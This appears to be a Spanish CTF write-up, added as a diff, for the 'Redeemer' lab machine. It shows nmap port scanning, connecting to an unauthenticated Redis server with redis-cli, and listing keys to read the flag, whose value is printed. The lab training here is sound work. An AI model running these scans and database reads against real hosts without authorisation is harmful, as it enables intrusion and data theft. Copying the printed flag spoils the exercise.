@@ -1,0 +1,43 @@
+Se levanta la máquina Redeemer y se asigna la dirección IP 10.129.134.123
+
+Se prueba conectividad enviando una traza icmp:
+
+ping -c 1 10.129.134.123
+
+Luego se hace una enumeración de los servicios abiertos:
+
+nmap -p- -sV 10.129.134.123 (al ejecutar el comando man nmap, se observa que el atributo -p- indica a nmap que escanee desde el puerto 1 al 65535
+y -sV habilita la detección de version del servicio). El comando anterior demora bastante tiempo, por lo que se opta por ejecutar el siguiente comando:
+
+nmap -T5 -p- -SV -n -v 10.129.134.123
+
+Obteniendo como resultado:
+Not shown: 65156 closed ports, 378 filtered ports                                 │
+PORT     STATE SERVICE VERSION                                                    │       -R (DNS resolution for all targets)
+6379/tcp open  redis   Redis key-value store 5.0.7 
+
+Del resultado anterior, se logra apreciar que se encuentra Redis operando en el puerto 6379/TCP.
+
+Para ello, mediante la herramienta redis-cli, se hará un reconocimiento de host mediante el siguiente comando:
+
+redis-cli -h 10.129.134.123
+
+Tras la ejecución, se levanta un promt. Para obtener mayor información de redis, se ejecuta el comando info, la cual entrega información y estadisticas del servidor redis.
+
+Para este caso en particular, se observa que existen 4 llaves del diccionario en la base de datos db0 del servidor.
+
+En función del resultado anterior, se puede concluir que el indice es 0, por lo tanto mediante select 0 se apunta al indice y posteriormente mediante
+keys * se listan las llaves asociadas, obteniendo como resultado:
+
+10.129.134.123:6379> keys *
+1) "numb"
+2) "temp"
+3) "flag"
+4) "stor"
+
+Una vez detectada la llave de interés (flag), se ejecuta el comando get:
+
+10.129.134.123:6379> get flag
+03e1d2b376c37ab3f5319922053953eb
+
+
